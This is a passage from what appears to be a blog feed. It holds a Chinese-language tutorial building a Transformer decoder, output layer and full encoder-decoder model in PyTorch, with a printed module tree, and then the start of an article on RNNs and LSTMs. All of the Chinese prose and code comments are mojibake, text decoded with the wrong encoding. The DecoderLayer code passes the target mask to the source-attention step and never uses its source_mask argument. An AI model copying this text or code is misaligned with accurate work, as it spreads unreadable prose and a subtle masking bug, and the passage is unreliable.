self_attnâ€”â€”å¤šå¤´è‡ªæ³¨æ„åŠ›å¯¹è±¡ï¼ˆQ=K=Vï¼‰</span><br><span class="hljs-string">        src_attnâ€”â€”å¤šå¤´æ³¨æ„åŠ›å¯¹è±¡ï¼ˆQ!=K=Vï¼‰</span><br><span class="hljs-string">        feed_forwardâ€”â€”å‰é¦ˆå…¨è¿æ¥å±‚</span><br><span class="hljs-string">        dropoutâ€”â€”ç½®é›¶æ¯”ç‡</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        <span class="hljs-built_in">super</span>(DecoderLayer, self).__init__()<br>        self.size = size<br>        self.self_attn = self_attn<br>        self.src_attn = src_attn<br>        self.feed_forward = feed_forward<br>        <span class="hljs-comment"># å…‹éš†ä¸‰ä¸ªå­å±‚è¿æ¥å¯¹è±¡</span><br>        self.sublayer = clones(SublayerConnection(size, dropout), <span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, memory, source_mask, target_mask</span>):<br>        <span class="hljs-comment"># memoryâ€”â€”æ¥è‡ªç¼–ç å™¨å±‚çš„è¯­ä¹‰å­˜å‚¨å˜é‡</span><br><br>        <span class="hljs-comment"># ç¬¬ä¸€å±‚â€”â€”è‡ªæ³¨æ„åŠ›æœºåˆ¶</span><br>        x = self.sublayer[<span class="hljs-number">0</span>](x, <span class="hljs-keyword">lambda</span> x: self.self_attn(x, x, x, target_mask))<br>        <span class="hljs-comment"># ç¬¬äºŒå±‚â€”â€”å¸¸è§„æ³¨æ„åŠ›æœºåˆ¶</span><br>        x = self.sublayer[<span class="hljs-number">1</span>](x, <span class="hljs-keyword">lambda</span> x: self.src_attn(x, memory, memory, target_mask))<br>        <span class="hljs-comment"># ç¬¬ä¸‰å±‚â€”â€”å‰é¦ˆå…¨è¿æ¥å±‚</span><br>        <span class="hljs-keyword">return</span> self.sublayer[<span class="hljs-number">2</span>](x, self.feed_forward)<br></code></pre></td></tr></table></figure><h3 id="è§£ç å™¨"><a href="#è§£ç å™¨" class="headerlink" title="è§£ç å™¨"></a>è§£ç å™¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Decoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, layer, N</span>):<br>        <span class="hljs-built_in">super</span>(Decoder, self).__init__()<br>        self.layers = clones(layer, N)<br>        self.norm = LayerNorm(layer.size)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, memory, source_mask, target_mask</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> self.layers:<br>            x = layer(x, memory, source_mask, target_mask)<br>        <span class="hljs-keyword">return</span> self.norm(x)<br><br></code></pre></td></tr></table></figure><h2 id="è¾“å‡ºéƒ¨åˆ†"><a href="#è¾“å‡ºéƒ¨åˆ†" class="headerlink" title="è¾“å‡ºéƒ¨åˆ†"></a>è¾“å‡ºéƒ¨åˆ†</h2><p><img src="/Pictures/DL/Attention/f6.png" alt="output"></p><h3 id="çº¿æ€§å±‚-softmaxå±‚"><a href="#çº¿æ€§å±‚-softmaxå±‚" class="headerlink" title="çº¿æ€§å±‚&amp;softmaxå±‚"></a>çº¿æ€§å±‚&amp;softmaxå±‚</h3><p>é€šè¿‡å¯¹ä¸Šä¸€æ­¥çš„çº¿æ€§å˜åŒ–å¾—åˆ°æŒ‡å®šç»´åº¦çš„è¾“å‡º,å¹¶å°†å‘é‡è¿›è¡Œå½’ä¸€åŒ–æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Generator</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, d_model, vocab_size</span>):<br>        <span class="hljs-built_in">super</span>(Generator, self).__init__()<br>        self.project = nn.Linear(d_model, vocab_size)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> F.log_softmax(self.project(x), dim=-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="æœ€ç»ˆæ¨¡å‹æ„å»º"><a href="#æœ€ç»ˆæ¨¡å‹æ„å»º" class="headerlink" title="æœ€ç»ˆæ¨¡å‹æ„å»º"></a>æœ€ç»ˆæ¨¡å‹æ„å»º</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_model</span>(<span class="hljs-params">source_vocab, target_vocab, N=<span class="hljs-number">6</span>, </span><br><span class="hljs-params">               d_model=<span class="hljs-number">512</span>, d_ff=<span class="hljs-number">2048</span>, head=<span class="hljs-number">8</span>, dropout=<span class="hljs-number">0.1</span></span>):<br><br>    c = copy.deepcopy<br>    attn = MultiHeadedAttention(head, d_model)<br>    ff = PositionwiseFeedForward(d_model, d_ff, dropout)<br>    position = PositionalEncoding(d_model, dropout)<br><br>    model = EncoderDecoder(<br>        Encoder(EncoderLayer(d_model, c(attn), c(ff), dropout), N),<br>        Decoder(DecoderLayer(d_model, c(attn), c(attn), <br>                             c(ff), dropout), N),<br>        nn.Sequential(Embeddings(d_model, source_vocab), c(position)),<br>        nn.Sequential(Embeddings(d_model, target_vocab), c(position)),<br>        Generator(d_model, target_vocab))<br><br>    <span class="hljs-comment"># æ¨¡å‹ç»“æ„å®Œæˆåï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆå§‹åŒ–æ¨¡å‹ä¸­çš„å‚æ•°ï¼Œæ¯”å¦‚çº¿æ€§å±‚ä¸­çš„å˜æ¢çŸ©é˜µ</span><br>    <span class="hljs-comment"># è¿™é‡Œä¸€ä½†åˆ¤æ–­å‚æ•°çš„ç»´åº¦å¤§äº1ï¼Œåˆ™ä¼šå°†å…¶åˆå§‹åŒ–æˆä¸€ä¸ªæœä»å‡åŒ€åˆ†å¸ƒçš„çŸ©é˜µï¼Œ</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> model.parameters():<br>        <span class="hljs-keyword">if</span> p.dim() &gt; <span class="hljs-number">1</span>:<br>            nn.init.xavier_uniform(p)<br>    <span class="hljs-keyword">return</span> model<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>nn.Sequential æ˜¯ PyTorch ä¸­çš„ä¸€ä¸ªå®¹å™¨ï¼Œç”¨äºæŒ‰é¡ºåºç»„åˆå¤šä¸ªç¥ç»ç½‘ç»œæ¨¡å—ï¼ˆå¦‚å±‚ã€æ¿€æ´»å‡½æ•°ç­‰ï¼‰ï¼Œå½¢æˆä¸€ä¸ªæ•´ä½“çš„ç¥ç»ç½‘ç»œæ¨¡å‹ã€‚å®ƒå¯ä»¥ç®€åŒ–æ¨¡å‹çš„æ„å»ºè¿‡ç¨‹ï¼Œä½¿ä»£ç æ›´åŠ ç®€æ´æ˜“è¯»ã€‚</p><p>å…·ä½“åœ°ï¼Œnn.Sequential æ¥å—ä¸€ä¸ªåŒ…å«å¤šä¸ªç¥ç»ç½‘ç»œæ¨¡å—çš„åˆ—è¡¨æˆ–åºåˆ—ä½œä¸ºå‚æ•°ï¼Œç„¶åå°†è¿™äº›æ¨¡å—æŒ‰é¡ºåºç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„ç¥ç»ç½‘ç»œæ¨¡å‹ã€‚å½“è¾“å…¥æ•°æ®è¿›å…¥ nn.Sequential æ—¶ï¼Œå®ƒä¼šæŒ‰ç…§åˆ—è¡¨ä¸­æ¨¡å—çš„é¡ºåºä¾æ¬¡è¿›è¡Œå‰å‘ä¼ æ’­ï¼Œå°†æ¯ä¸ªæ¨¡å—çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªæ¨¡å—çš„è¾“å…¥ï¼Œç›´åˆ°æ‰€æœ‰æ¨¡å—éƒ½è¢«å¤„ç†å®Œæ¯•ï¼Œæœ€ç»ˆå¾—åˆ°æ•´ä¸ªæ¨¡å‹çš„è¾“å‡ºã€‚</p>          </div><p>æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„æ¨¡å‹(ä¸‹æ–¹è¾ƒé•¿)ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs routeros">EncoderDecoder(<br>  (encoder): Encoder(<br>    (layers): ModuleList(<br>      (0-5): 6 x EncoderLayer(<br>        (self_attn): MultiHeadedAttention(<br>          (linears): ModuleList(<br>            (0-3): 4 x Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=512, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          )<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (feed_forward): PositionwiseFeedForward(<br>          (w1): Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=2048, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          (w2): Linear(<span class="hljs-attribute">in_features</span>=2048, <span class="hljs-attribute">out_features</span>=512, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (sublayer): ModuleList(<br>          (0-1): 2 x SublayerConnection(<br>            (norm): LayerNorm()<br>            (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>          )<br>        )<br>      )<br>    )<br>    (norm): LayerNorm()<br>  )<br>  (decoder): Decoder(<br>    (layers): ModuleList(<br>      (0-5): 6 x DecoderLayer(<br>        (self_attn): MultiHeadedAttention(<br>          (linears): ModuleList(<br>            (0-3): 4 x Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=512, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          )<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (src_attn): MultiHeadedAttention(<br>          (linears): ModuleList(<br>            (0-3): 4 x Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=512, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          )<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (feed_forward): PositionwiseFeedForward(<br>          (w1): Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=2048, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          (w2): Linear(<span class="hljs-attribute">in_features</span>=2048, <span class="hljs-attribute">out_features</span>=512, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (sublayer): ModuleList(<br>          (0-2): 3 x SublayerConnection(<br>            (norm): LayerNorm()<br>            (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>          )<br>        )<br>      )<br>    )<br>    (norm): LayerNorm()<br>  )<br>  (src_embed): Sequential(<br>    (0): Embeddings(<br>      (lut): Embedding(11, 512)<br>    )<br>    (1): PositionalEncoding(<br>      (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>    )<br>  )<br>  (tgt_embed): Sequential(<br>    (0): Embeddings(<br>      (lut): Embedding(11, 512)<br>    )<br>    (1): PositionalEncoding(<br>      (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>    )<br>  )<br>  (generator): Generator(<br>    (project): Linear(<span class="hljs-attribute">in_features</span>=512, <span class="hljs-attribute">out_features</span>=11, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">True</span>)<br>  )<br>)<br></code></pre></td></tr></table></figure><hr><p>å‚è€ƒï¼š</p><ol><li><a href="https://lulaoshi.info/deep-learning/attention/transformer-attention.html#self-attention%E4%B8%AD%E7%9A%84q%E3%80%81k%E3%80%81v">https://lulaoshi.info/deep-learning/attention/transformer-attention.html#self-attention%E4%B8%AD%E7%9A%84q%E3%80%81k%E3%80%81v</a></li><li><a href="https://juejin.cn/post/7125629962769399838">https://juejin.cn/post/7125629962769399838</a></li><li><a href="http://121.199.45.168:13008/04_mkdocs_transformer/3%20%E8%BE%93%E5%85%A5%E9%83%A8%E5%88%86%E5%AE%9E%E7%8E%B0.html">http://121.199.45.168:13008/04_mkdocs_transformer/3%20%E8%BE%93%E5%85%A5%E9%83%A8%E5%88%86%E5%AE%9E%E7%8E%B0.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RNNâ€”â€”å¾ªç¯ç¥ç»ç½‘ç»œ</title>
    <link href="/2024/03/04/RNN/"/>
    <url>/2024/03/04/RNN/</url>
    
    <content type="html"><![CDATA[<h1 id="RNNæ¦‚è¿°"><a href="#RNNæ¦‚è¿°" class="headerlink" title="RNNæ¦‚è¿°"></a>RNNæ¦‚è¿°</h1><p>å½“æˆ‘ä»¬åœ¨ç†è§£ä¸€å¥è¯æ„æ€æ—¶ï¼Œå­¤ç«‹çš„ç†è§£è¿™å¥è¯çš„æ¯ä¸ªè¯æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬éœ€è¦å¤„ç†è¿™äº›è¯è¿æ¥èµ·æ¥çš„æ•´ä¸ªåºåˆ—ï¼›å½“æˆ‘ä»¬å¤„ç†è§†é¢‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½åªå•ç‹¬çš„å»åˆ†ææ¯ä¸€å¸§ï¼Œè€Œè¦åˆ†æè¿™äº›å¸§è¿æ¥èµ·æ¥çš„æ•´ä¸ªåºåˆ—ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸ªç®€å•çš„å¾ªç¯ç¥ç»ç½‘ç»œå¦‚ï¼Œå®ƒç”±è¾“å…¥å±‚ã€ä¸€ä¸ªéšè—å±‚å’Œä¸€ä¸ªè¾“å‡ºå±‚ç»„æˆï¼š</p><p><img src="/Pictures/DL/RNN/plot01.png" alt="img"></p><p>å…¶ä¸­ï¼Œ$O$ æ˜¯ä¸€ä¸ªå‘é‡ï¼Œä»£è¡¨è¾“å‡ºå±‚çš„å€¼ï¼›$V$ æ˜¯éšè—å±‚åˆ°è¾“å‡ºå±‚çš„æƒé‡çŸ©é˜µï¼Œ$U$ æ˜¯è¾“å…¥å±‚åˆ°éšè—å±‚çš„æƒé‡çŸ©é˜µã€‚</p><p>å¾ªç¯ç¥ç»ç½‘ç»œçš„éšè—å±‚çš„å€¼Sä¸ä»…ä»…å–å†³äºå½“å‰è¿™æ¬¡çš„è¾“å…¥ $X$ ï¼Œè¿˜å–å†³äºä¸Šä¸€æ¬¡éšè—å±‚çš„å€¼ $Sâ€™$ ã€‚æƒé‡çŸ©é˜µ $W$ å°±æ˜¯éšè—å±‚ä¸Šä¸€æ¬¡çš„å€¼ä½œä¸ºè¿™ä¸€æ¬¡çš„è¾“å…¥çš„æƒé‡ã€‚</p><p>æŒ‰æ—¶é—´çº¿å±•å¼€ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹å›¾ï¼š</p><p><img src="/Pictures/DL/RNN/plot03.png" alt="img"></p><p>ä¸è€ƒè™‘biasçš„æƒ…å†µä¸‹ï¼Œå…¬å¼å¯ä»¥ç®€åŒ–ä¸ºï¼š</p><p>$$\begin{cases}<br>O_{t} &#x3D; g(V \ldotp S_{t}) \\<br>S_{t} &#x3D; f(U \ldotp X_{t}+W \ldotp S_{t-1})<br>\end{cases}$$</p><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>ç¬¬ä¸€æ­¥: ç”¨æˆ·è¾“å…¥äº†â€What time is it ?â€, æˆ‘ä»¬é¦–å…ˆéœ€è¦å¯¹å®ƒè¿›è¡ŒåŸºæœ¬çš„åˆ†è¯, å› ä¸ºRNNæ˜¯æŒ‰ç…§é¡ºåºå·¥ä½œçš„, æ¯æ¬¡åªæ¥æ”¶ä¸€ä¸ªå•è¯è¿›è¡Œå¤„ç†.</p><p>ç¬¬äºŒæ­¥: é¦–å…ˆå°†å•è¯â€Whatâ€è¾“é€ç»™RNN, å®ƒå°†äº§ç”Ÿä¸€ä¸ªè¾“å‡º $O_{1}$.</p><p>ç¬¬ä¸‰æ­¥: ç»§ç»­å°†å•è¯â€timeâ€è¾“é€ç»™RNN, ä½†æ­¤æ—¶RNNä¸ä»…ä»…åˆ©ç”¨â€timeâ€æ¥äº§ç”Ÿè¾“å‡º $O_{2}$ , è¿˜ä¼šä½¿ç”¨æ¥è‡ªä¸Šä¸€å±‚éšå±‚è¾“å‡º $O_{1}$ ä½œä¸ºè¾“å…¥ä¿¡æ¯.</p><p>ç¬¬å››æ­¥: é‡å¤è¿™æ ·çš„æ­¥éª¤, ç›´åˆ°å¤„ç†å®Œæ‰€æœ‰çš„å•è¯.</p><p>ç¬¬äº”æ­¥: æœ€åï¼Œå°†æœ€ç»ˆçš„éšå±‚è¾“å‡º $O_{5}$ è¿›è¡Œå¤„ç†æ¥è§£æç”¨æˆ·æ„å›¾.</p><h1 id="RNNæ¨¡å‹çš„åˆ†ç±»"><a href="#RNNæ¨¡å‹çš„åˆ†ç±»" class="headerlink" title="RNNæ¨¡å‹çš„åˆ†ç±»"></a>RNNæ¨¡å‹çš„åˆ†ç±»</h1><p>æŒ‰ç…§è¾“å…¥å’Œè¾“å‡ºçš„ç»“æ„è¿›è¡Œåˆ†ç±»:</p><ul><li>N vs N - RNNï¼šè¾“å…¥å’Œè¾“å‡ºåºåˆ—æ˜¯ç­‰é•¿çš„ã€‚</li><li>N vs 1 - RNNï¼šè¾“å‡ºæ˜¯ä¸€ä¸ªå•ç‹¬çš„å€¼è€Œä¸æ˜¯åºåˆ—ã€‚</li><li>1 vs N - RNNï¼šè¾“å…¥ä¸æ˜¯åºåˆ—è€Œè¾“å‡ºä¸ºåºåˆ—</li><li>N vs M - RNNï¼šä¸é™è¾“å…¥è¾“å‡ºé•¿åº¦çš„RNNç»“æ„ï¼Œç”±ç¼–ç å™¨å’Œè§£ç å™¨ä¸¤éƒ¨åˆ†ç»„æˆ, ä¸¤è€…çš„å†…éƒ¨ç»“æ„éƒ½æ˜¯æŸç±»RNN, å®ƒä¹Ÿè¢«ç§°ä¸ºseq2seqæ¶æ„ã€‚è¾“å…¥æ•°æ®é¦–å…ˆé€šè¿‡ç¼–ç å™¨, æœ€ç»ˆè¾“å‡ºä¸€ä¸ªéšå«å˜é‡c, ä¹‹åæœ€å¸¸ç”¨çš„åšæ³•æ˜¯ä½¿ç”¨è¿™ä¸ªéšå«å˜é‡cä½œç”¨åœ¨è§£ç å™¨è¿›è¡Œè§£ç çš„æ¯ä¸€æ­¥ä¸Š, ä»¥ä¿è¯è¾“å…¥ä¿¡æ¯è¢«æœ‰æ•ˆåˆ©ç”¨ã€‚</li></ul><p>æŒ‰ç…§RNNçš„å†…éƒ¨æ„é€ è¿›è¡Œåˆ†ç±»:</p><ul><li>ä¼ ç»ŸRNN</li><li>LSTM</li><li>Bi-LSTM</li><li>GRU</li><li>Bi-GRU</li></ul><h2 id="ä¼ ç»ŸRNN"><a href="#ä¼ ç»ŸRNN" class="headerlink" title="ä¼ ç»ŸRNN"></a>ä¼ ç»ŸRNN</h2><p><img src="/Pictures/DL/RNN/plot04.png" alt="img"><br><img src="/Pictures/DL/RNN/plot05.png" alt="img"></p><blockquote><p>æ¥ä¸‹æ¥ä½¿ç”¨h(t)æ¥ä»£è¡¨éšè—å±‚çš„è¾“å‡º</p></blockquote><p>æˆ‘ä»¬æŠŠç›®å…‰é›†ä¸­åœ¨ä¸­é—´çš„æ–¹å—éƒ¨åˆ†, å®ƒçš„è¾“å…¥æœ‰ä¸¤éƒ¨åˆ†, åˆ†åˆ«æ˜¯ $h(t-1)$ ä»¥åŠ $x(t)$, ä»£è¡¨ä¸Šä¸€æ—¶é—´æ­¥çš„éšå±‚è¾“å‡º, ä»¥åŠæ­¤æ—¶é—´æ­¥çš„è¾“å…¥, å®ƒä»¬è¿›å…¥RNNç»“æ„ä½“å, ä¼šâ€èåˆâ€åˆ°ä¸€èµ·, è¿™ç§èåˆæˆ‘ä»¬æ ¹æ®ç»“æ„è§£é‡Šå¯çŸ¥, æ˜¯å°†äºŒè€…è¿›è¡Œæ‹¼æ¥, å½¢æˆæ–°çš„å¼ é‡ $[x(t), h(t-1)]$ , ä¹‹åè¿™ä¸ªæ–°çš„å¼ é‡å°†é€šè¿‡ä¸€ä¸ªå…¨è¿æ¥å±‚(çº¿æ€§å±‚), è¯¥å±‚ä½¿ç”¨ $tanh$ ä½œä¸ºæ¿€æ´»å‡½æ•°, æœ€ç»ˆå¾—åˆ°è¯¥æ—¶é—´æ­¥çš„è¾“å‡º $h(t)$, å®ƒå°†ä½œä¸ºä¸‹ä¸€ä¸ªæ—¶é—´æ­¥çš„è¾“å…¥å’Œ $x(t+1)$ ä¸€èµ·è¿›å…¥ç»“æ„ä½“ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p>$$h_{t} &#x3D; tanh(W_{t}[X_{t},h_{t-1}]+b_{t})$$</p><p>ä½¿ç”¨PyTorchæ„å»ºæ¨¡å‹ï¼šé€šè¿‡torch.nn.RNNå¯è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯¼å…¥å·¥å…·åŒ…</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-meta">&gt;&gt;&gt; </span>rnn = nn.RNN(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">input</span> = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>h0 = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>output, hn = rnn(<span class="hljs-built_in">input</span>, h0)<br><span class="hljs-meta">&gt;&gt;&gt; </span>output<br>tensor([[[ <span class="hljs-number">0.4282</span>, -<span class="hljs-number">0.8475</span>, -<span class="hljs-number">0.0685</span>, -<span class="hljs-number">0.4601</span>, -<span class="hljs-number">0.8357</span>,  <span class="hljs-number">0.1252</span>],<br>         [ <span class="hljs-number">0.5758</span>, -<span class="hljs-number">0.2823</span>,  <span class="hljs-number">0.4822</span>, -<span class="hljs-number">0.4485</span>, -<span class="hljs-number">0.7362</span>,  <span class="hljs-number">0.0084</span>],<br>         [ <span class="hljs-number">0.9224</span>, -<span class="hljs-number">0.7479</span>, -<span class="hljs-number">0.3682</span>, -<span class="hljs-number">0.5662</span>, -<span class="hljs-number">0.9637</span>,  <span class="hljs-number">0.4938</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>hn<br>tensor([[[ <span class="hljs-number">0.4282</span>, -<span class="hljs-number">0.8475</span>, -<span class="hljs-number">0.0685</span>, -<span class="hljs-number">0.4601</span>, -<span class="hljs-number">0.8357</span>,  <span class="hljs-number">0.1252</span>],<br>         [ <span class="hljs-number">0.5758</span>, -<span class="hljs-number">0.2823</span>,  <span class="hljs-number">0.4822</span>, -<span class="hljs-number">0.4485</span>, -<span class="hljs-number">0.7362</span>,  <span class="hljs-number">0.0084</span>],<br>         [ <span class="hljs-number">0.9224</span>, -<span class="hljs-number">0.7479</span>, -<span class="hljs-number">0.3682</span>, -<span class="hljs-number">0.5662</span>, -<span class="hljs-number">0.9637</span>,  <span class="hljs-number">0.4938</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br></code></pre></td></tr></table></figure><p>input_size: è¾“å…¥å¼ é‡ $X$ ä¸­ç‰¹å¾ç»´åº¦çš„å¤§å°<br>hidden_size: éšå±‚å¼ é‡ $h$ ä¸­ç‰¹å¾ç»´åº¦çš„å¤§å°<br>num_layers: éšå«å±‚çš„æ•°é‡<br>nonlinearity: æ¿€æ´»å‡½æ•°çš„é€‰æ‹©, é»˜è®¤æ˜¯ $tanh$</p><p>ä¼ ç»ŸRNNåœ¨è§£å†³é•¿åºåˆ—ä¹‹é—´çš„å…³è”æ—¶, é€šè¿‡å®è·µï¼Œè¯æ˜ç»å…¸RNNè¡¨ç°å¾ˆå·®, åŸå› æ˜¯åœ¨è¿›è¡Œåå‘ä¼ æ’­çš„æ—¶å€™, è¿‡é•¿çš„åºåˆ—å¯¼è‡´æ¢¯åº¦çš„è®¡ç®—å¼‚å¸¸, å‘ç”Ÿæ¢¯åº¦æ¶ˆå¤±æˆ–çˆ†ç‚¸ã€‚</p><h2 id="LSTMæ¨¡å‹"><a href="#LSTMæ¨¡å‹" class="headerlink" title="LSTMæ¨¡å‹"></a>LSTMæ¨¡å‹</h2><p>LSTMï¼ˆLong Short-Term Memoryï¼‰ä¹Ÿç§°é•¿çŸ­æ—¶è®°å¿†ç»“æ„, å®ƒæ˜¯ä¼ ç»ŸRNNçš„å˜ä½“, ä¸ç»å…¸RNNç›¸æ¯”èƒ½å¤Ÿæœ‰æ•ˆæ•æ‰é•¿åºåˆ—ä¹‹é—´çš„è¯­ä¹‰å…³è”, ç¼“è§£æ¢¯åº¦æ¶ˆå¤±æˆ–çˆ†ç‚¸ç°è±¡. åŒæ—¶LSTMçš„ç»“æ„æ›´å¤æ‚, å®ƒçš„æ 